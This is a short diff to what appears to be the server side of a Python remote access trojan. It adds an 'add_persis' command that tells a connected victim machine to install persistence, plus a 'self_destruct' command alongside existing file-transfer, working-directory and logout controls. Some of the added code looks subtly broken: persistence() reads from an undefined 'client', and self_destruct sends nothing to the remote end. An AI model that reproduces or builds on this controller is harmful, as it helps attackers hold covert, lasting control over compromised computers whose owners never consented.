@@ -51,6 +51,13 @@ def recv_file(client, name=''):
     return True
 
 
+def persistence():
+    msg = (client.recv(10240)).decode()
+    print()
+    print(msg)
+    print()
+
+
 def get_cwd(client):
     cwd = (client.recv(10240)).decode()
     if cwd[:6] == b'Failed':
@@ -326,6 +333,9 @@ def send_command(client, Id, ip):
                 print()
             elif command == 'clear':
                 clear_screen()
+            elif command == 'add_persis':
+                client.send(command.encode())
+                persistence()
             elif command == 'cwd':
                 client.send(command.encode())
                 get_cwd(client=client)
@@ -386,6 +396,9 @@ def send_command(client, Id, ip):
             elif command == 'logout':
                 client.send(command.encode())
                 logout(client=client)
+            elif command == 'self_destruct':
+                print(f"{g.info} Initiated self destruct on '{Id}'")
+                return
             elif command in ['exit', 'quit']:
                 client.send(b'exit')
                 return
